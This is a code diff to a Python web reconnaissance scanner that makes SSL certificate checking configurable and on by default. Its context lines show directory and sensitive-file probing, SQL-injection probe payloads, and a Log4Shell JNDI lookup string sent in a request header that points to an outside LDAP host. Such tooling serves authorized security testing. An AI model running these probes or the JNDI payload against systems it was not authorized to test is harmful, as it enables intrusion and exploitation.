@@ -16,17 +16,35 @@ from typing import Dict, List, Optional
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# 创建不验证SSL的上下文
-ssl_context = ssl.create_default_context()
-ssl_context.check_hostname = False
-ssl_context.verify_mode = ssl.CERT_NONE
+
+def create_ssl_context(verify: bool = True) -> ssl.SSLContext:
+    """创建SSL上下文
+
+    Args:
+        verify: 是否验证SSL证书 (默认True)
+    """
+    if verify:
+        return ssl.create_default_context()
+    else:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        return ctx
 
 
 class FullReconEngine:
     """全量侦察引擎"""
-    
-    def __init__(self, target: str):
+
+    def __init__(self, target: str, verify_ssl: bool = True):
+        """初始化侦察引擎
+
+        Args:
+            target: 目标URL
+            verify_ssl: 是否验证SSL证书 (默认True，生产环境建议开启)
+        """
         self.target = target
+        self.verify_ssl = verify_ssl
+        self.ssl_context = create_ssl_context(verify_ssl)
         self.results = {
             "target": target,
             "start_time": datetime.now().isoformat(),
@@ -152,7 +170,7 @@ class FullReconEngine:
         """Web指纹识别"""
         try:
             req = urllib.request.Request(self.target, headers=self.headers)
-            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
+            with urllib.request.urlopen(req, timeout=10, context=self.ssl_context) as response:
                 headers = dict(response.headers)
                 content = response.read().decode('utf-8', errors='ignore')
             
@@ -202,7 +220,7 @@ class FullReconEngine:
             try:
                 url = f"{self.target.rstrip('/')}{dir_path}"
                 req = urllib.request.Request(url, headers=self.headers)
-                with urllib.request.urlopen(req, timeout=3, context=ssl_context) as response:
+                with urllib.request.urlopen(req, timeout=3, context=self.ssl_context) as response:
                     if response.status == 200:
                         found_dirs.append(dir_path)
             except Exception:
@@ -215,7 +233,7 @@ class FullReconEngine:
         """JS文件分析"""
         try:
             req = urllib.request.Request(self.target, headers=self.headers)
-            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
+            with urllib.request.urlopen(req, timeout=10, context=self.ssl_context) as response:
                 content = response.read().decode('utf-8', errors='ignore')
             
             # 提取JS文件
@@ -234,7 +252,7 @@ class FullReconEngine:
                         js_url = js_file
                     
                     req = urllib.request.Request(js_url, headers=self.headers)
-                    with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
+                    with urllib.request.urlopen(req, timeout=5, context=self.ssl_context) as response:
                         js_content = response.read().decode('utf-8', errors='ignore')
                     
                     # 提取API端点
@@ -272,7 +290,7 @@ class FullReconEngine:
             try:
                 url = f"{self.target.rstrip('/')}{path}"
                 req = urllib.request.Request(url, headers=self.headers)
-                with urllib.request.urlopen(req, timeout=3, context=ssl_context) as response:
+                with urllib.request.urlopen(req, timeout=3, context=self.ssl_context) as response:
                     if response.status == 200:
                         found_files.append(path)
                         self.results["vulnerabilities"].append({
@@ -297,7 +315,7 @@ class FullReconEngine:
                 for payload in test_payloads:
                     modified_url = test_url + payload
                     req = urllib.request.Request(modified_url, headers=self.headers)
-                    with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
+                    with urllib.request.urlopen(req, timeout=5, context=self.ssl_context) as response:
                         content = response.read().decode('utf-8', errors='ignore')
                         # 检测SQL错误
                         if any(err in content.lower() for err in ['sql', 'mysql', 'syntax error']):
@@ -315,7 +333,7 @@ class FullReconEngine:
             test_headers = self.headers.copy()
             test_headers['X-Api-Version'] = '${jndi:ldap://test.com/a}'
             req = urllib.request.Request(self.target, headers=test_headers)
-            urllib.request.urlopen(req, timeout=5, context=ssl_context)
+            urllib.request.urlopen(req, timeout=5, context=self.ssl_context)
         except Exception:
             pass
         
@@ -325,7 +343,7 @@ class FullReconEngine:
         """WAF检测"""
         try:
             req = urllib.request.Request(self.target, headers=self.headers)
-            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
+            with urllib.request.urlopen(req, timeout=10, context=self.ssl_context) as response:
                 headers = dict(response.headers)
             
             waf_indicators = {
